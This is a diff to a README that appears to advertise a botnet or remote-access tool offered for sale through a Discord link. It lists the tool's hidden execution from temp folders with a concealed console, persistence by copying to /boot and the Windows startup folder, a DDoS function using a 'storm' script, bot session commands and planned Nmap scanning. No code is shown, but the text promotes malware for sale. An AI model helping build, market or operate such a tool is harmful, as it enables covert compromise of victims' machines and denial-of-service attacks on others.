@@ -5,13 +5,15 @@
 https://discord.gg/vCdPTjD6rZ - Buy? Dm me.
 
 # Features
-* Hidden (Works in /tmp, %temp%)
+* Hidden (Works in /tmp, %temp% + Console is always hidden)
 * Persistence (Copying to /boot, shell:startup)
 * Tested on Windows and Linux platforms
 * DDoS attack uses 'storm' script
 
 # Soon
+* Restart session
 * Nmap scan
+* ?
 
 # Bot Commands
 * !sessions 					List open sessions
